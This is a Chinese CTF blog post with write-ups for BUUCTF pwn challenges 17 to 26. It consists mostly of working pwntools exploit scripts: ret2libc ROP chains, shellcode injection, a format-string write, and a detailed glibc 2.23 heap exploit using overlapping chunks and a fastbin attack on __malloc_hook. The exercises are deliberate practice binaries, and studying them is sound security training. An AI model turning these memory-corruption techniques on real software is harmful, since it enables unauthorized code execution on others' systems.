---
title: buuctf-pwn write-ups (2)
date: 2023-02-28 22:05:00
categories:
- write-ups
- buuctf 系列
---
重点讲解第26题：babyheap的解题方法。

# buu017-not_the_same_3dsctf_2016
```python
from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25850)
elf = ELF('./pwn')

payload = cyclic(0x2d) + p32(elf.symbols['get_secret']) + p32(elf.symbols['write']) + p32(0xdeadbeef) + p32(1) + p32(0x80ECA2D) + p32(0x40)

io.sendline(payload)

io.interactive()
```
# buu018-ciscn_2019_n_5

```python
from pwn import *
from LibcSearcher import *
context.arch='amd64'
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29724)
elf = ELF('./pwn')

poprdi_ret = 0x400713
ret = 0x4004c9
bss = 0x601080
leave = 0x4006a9
io.sendlineafter(b'tell me your name', asm(shellcraft.amd64.sh()))

payload = cyclic(0x20) + p64(bss) + p64(bss)
io.sendlineafter(b'What do you want to say to me?\n', payload)

io.interactive()
```
# buu019-others_shellcode
连上就行
# buu020-ciscn_2019_ne_5
```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25761)
elf = ELF('./pwn')

io.sendlineafter(b'Please input admin password:', b'administrator')

payload = cyclic(76) + p32(elf.plt['puts']) + p32(elf.symbols['main']) + p32(elf.got['printf'])

io.sendlineafter(b'0.Exit\n:', b'1')
io.sendlineafter(b'Please input new log info:', payload)
io.sendlineafter(b'0.Exit\n:', b'4')

io.recvuntil(p32(elf.got['printf']) + b'\n')
printf = u32(io.recv(4))

libc = LibcSearcher('printf', printf)
base = printf - libc.dump('printf')
binsh = base + libc.dump('str_bin_sh')

io.sendlineafter(b'Please input admin password:', b'administrator')

payload = cyclic(76) + p32(elf.plt['system']) + p32(0xdeadbeef) + p32(binsh)
io.sendlineafter(b'0.Exit\n:', b'1')
io.sendlineafter(b'Please input new log info:', payload)
io.sendlineafter(b'0.Exit\n:', b'4')
io.interactive()
```
# buu021-铁人三项(第五赛区)_2018_rop

```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 26419)
elf = ELF('./pwn')
# libc = ELF('libc32')

payload = cyclic(0x8c) + p32(elf.symbols['write']) + p32(elf.symbols['vulnerable_function'])
payload += p32(1) + p32(elf.got['read']) + p32(24)

io.sendline(payload)
io.recv(16)
write = u32(io.recv(4))
print(hex(write))

libc = LibcSearcher('write', write)
base = write - libc.dump('write')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

# base = write - libc.symbols['write']
# sys = base + libc.symbols['system']
# binsh = base + next(libc.search(b'/bin/sh'))
print(hex(base))
print(hex(sys))
print(hex(binsh))

payload = cyclic(0x8c) + p32(sys) + p32(binsh) + p32(binsh)
io.sendline(payload)

io.interactive()
```
# buu022-bjdctf_2020_babyrop

```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27132)
elf = ELF('./pwn')

poprdi_ret = 0x400733

payload = cyclic(0x20 + 8) + p64(poprdi_ret) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['vuln'])

io.sendlineafter(b'tell me u story!\n', payload)
puts = u64(io.recv(6) + b'\x00\x00')

libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

print(hex(base))
print(hex(sys))
print(hex(binsh))

payload = cyclic(0x20 + 8) + p64(poprdi_ret) + p64(binsh)
payload += p64(sys)
payload += p64(elf.symbols['vuln'])
io.sendlineafter(b'tell me u story!\n', payload)

io.interactive()
```
# buu023-bjdctf_2020_babystack2

```python
from pwn import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25497)
elf = ELF('./pwn')

io.sendlineafter(b'[+]Please input the length of your name:', b'-1')

io.sendlineafter(b'[+]What\'s u name?', cyclic(16+8) + p64(elf.symbols['backdoor']))

io.interactive()
```
# buu024-jarvisoj_fm
```python
from pwn import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29021)
elf = ELF('./pwn')

io.sendline(fmtstr_payload(11, {0x804A02C: 4}))

io.interactive()
```
# buu025-pwn2_sctf_2016
这一题真是吃尽苦头，LibcSearcher不给力，找半天也没找到适合的libc（应该是libc6-i386_2.23_0ubuntu10_amd64，但是由于LibcSearcher连的是ubuntu官网，这个版本被删了，然后就找不到了。。。）。看着这道题没做出来实在是气，不过又看到了程序中有一个int 80，于是思考能不能用系统调用解决问题。发现很难，因为给的gadget都是inc，执行完vuln函数之后eax,ebx,edx都是很小的值，总不可能一个inc执行几十万次吧？
查看了下gadget，ebx,edi,esi,ebp倒是能直接控制，对于eax,ecx,edx还是要费很多心思。
后来给用pip装的LibcSearcher卸了换上[国人写的](https://github.com/lieanu/LibcSearcher)就好了。果然还是国人给力o(￣▽￣)ｄ
exp：

```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29855)
elf = ELF('./pwn')

def read_anyaddr(addr):
	io.sendlineafter(b'want me to read? ', b'-1')
	io.sendlineafter(b'bytes of data!', cyclic(0x2C + 4) + p32(elf.plt['printf']) + p32(elf.symbols['vuln']) + p32(addr))
	content = io.recvuntil(b'How', drop=True)
	return len(content)

io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
io.sendlineafter(b'bytes of data!', cyclic(0x2C + 4) + p32(elf.plt['printf']) + p32(elf.symbols['vuln']) + p32(elf.got['printf']))
io.recvuntil(p32(elf.got['printf']) + b'\n')

# io.recv(4)
printf = u32(io.recv(4))

libc = LibcSearcher('printf', printf)
print(hex(printf))
base = printf - libc.dump('printf')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

print(hex(base))
print(hex(sys))
print(hex(binsh))

io.sendline(b'-1')
io.sendlineafter(b'bytes of data!', cyclic(0x2C + 4) + p32(sys) + p32(binsh) + p32(binsh))

io.interactive()
```
# buu026-babyheap_0ctf_2017
第一道堆题。
**解法：unsorted bin overlapping chunks + fastbin attack**
提供了分配chunk、填充chunk、释放chunk、打印chunk内容4个功能。其中填充chunk功能没有进行边界检查，可以产生堆溢出：
![](1.png)
简单看了一下，试了几下之后，发现这道题和前面所有题都截然不同，难度完全不是一个档次。
首先，这道题中**对于内存的分配使用的是calloc而非malloc函数**，这使得我们要想获得libc的加载地址必须首先进行堆块重叠后释放内部堆块，这样才能够通过读取外部堆块获取关键地址。另外，**本题的堆块大小保存在一个单独的数组之中，可读取的大小也在这里保存，因此直接在堆中修改chunk的size并不能增加我们读取的长度**。要想实现堆块的重叠就必须首先释放堆块，通过堆溢出修改堆块的size后分配回来。但这样的话，由于calloc的特性，堆块中的所有内容都将被抹除，也就无法获取到地址的值。因此，要保留地址的值，我们不能将这个堆块全部分配回来。要知道，虽然内部重叠堆块的prev_size和size等信息虽然被清零，但仍然能够读取后面的内容，所以我们选择将修改过大小的堆块部分分配回来，留下一个last_remainder堆块保留在原先的内部堆块的内部。这样就可以通过访问内部堆块获取到地址的值了。
![](2.png)

获取到了这里的地址，我们就可以获取到system函数和__free_hook的地址。本题环境为2.23，无tcache的影响，有通过fastbin attack修改__malloc_hook的可行性。

这是一开始__malloc_hook附近的情况：
![](3.png)
要想在__malloc_hook附近分配chunk，首先需要通过检查：
```c
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
  {
    errstr = "malloc(): memory corruption (fast)";
  errout:
    malloc_printerr (check_action, errstr, chunk2mem (victim), av);
    return NULL;
  }
```
下面是fastbin_index的宏定义：
```c
#define fastbin_index(sz) \
  ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
```
我们可以通过地址错位达到目的：

|address|+0|+1|+2|+3|+4|+5|+6|+7
|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
|0x7fc36e4ddaf0|60|c2|4d|6e|c3|<font color=red>7f</font>|<font color=red>00</font>|<font color=red>00</font>|
|0x7fc36e4ddaf8|<font color=red>00</font>|<font color=red>00</font>|<font color=red>00</font>|<font color=red>00</font>|<font color=red>00</font>|00|00|00|
|0x7fc36e4ddb00|a0|ee|19|6e|c3|7f|00|00|

红色部分刚好能通过这个检查，需要使fd变为__malloc_hook-0x23才行，其对应的fastbin应该是存放0x70大小chunk的fastbin，因此我们要事先分配好0x70大小的chunk然后释放它，修改fd指针后再申请回来即可。
拿到__malloc_hook处的chunk后向__malloc_hook写入one_gadget即可，尝试了4个只有一个能成功，而且最后一次分配chunk还必须在interactive之后手动分配，自动分配打远程会卡住......

exp:
```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

io = process('./pwn')
# io = remote('node4.buuoj.cn', 29330)

in_use = [False] * 0x10		# in_use array
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

def allocate(size):
	io.sendlineafter(b'Command: ', b'1')
	io.sendlineafter(b'Size: ', str(size).encode())
	io.recvuntil(b'Allocate Index ')
	allocated_index = int(io.recvuntil('\n', drop=True), 10)
	in_use[allocated_index] = True
	
def fill(index, size, content):
	io.sendlineafter(b'Command: ', b'2')
	io.sendlineafter(b'Index: ', str(index).encode())
	io.sendlineafter(b'Size: ', str(size).encode())
	io.sendafter(b'Content: ', content)
	
def release(index):
	io.sendlineafter(b'Command: ', b'3')
	io.sendlineafter(b'Index: ', str(index).encode())
	in_use[index] = False

def dump(index):
	io.sendlineafter(b'Command: ', b'4')
	io.sendlineafter(b'Index: ', str(index).encode())
	io.recvuntil(b'Content: \n')

allocate(0x110)		# chunk #0
allocate(0x110)		# chunk #1
allocate(0x110)		# chunk #2
allocate(0x110)		# chunk #3

payload = cyclic(0x110)
payload += p64(0x120)		# prev_size of chunk #1
payload += p64(0x241)		# fake size of chunk #1
fill(0, 0x120, payload)

release(1)
allocate(0x130)		# fake chunk #1

dump(2)
io.recv(0x20)
malloc_hook = u64(io.recv(8)) - 88 - 0x10
print(hex(malloc_hook))
libc = LibcSearcher('__malloc_hook', malloc_hook)
base = malloc_hook - libc.dump('__malloc_hook')
free_hook = base + libc.dump('__free_hook')

fill(2, 0x30, b'\x00' * 0x18 + p64(0x100) + p64(malloc_hook + 0x10 + 88) + p64(malloc_hook + 0x10 + 88))

allocate(0xf0)		# chunk #4
allocate(0x20)		# chunk #5
allocate(0x60)		# chunk #6

release(6)
gdb.attach(io)
fill(5, 0x38, b'\x00' * 0x20 + p64(0x30) + p64(0x71) + p64(malloc_hook - 0x23))	# fastbin attack
allocate(0x60)		# chunk #6
allocate(0x60)		# chunk #7, this one is on __malloc_hook

fill(7, 0x1B, b'\x00' * 0x13 + p64(one_gadgets[1] + base))	# write one_gadget
# gdb.attach(io)
# release(6)

# allocate(0x20)	### DO THIS IN INTERACTIVE()!!!
io.interactive()
```
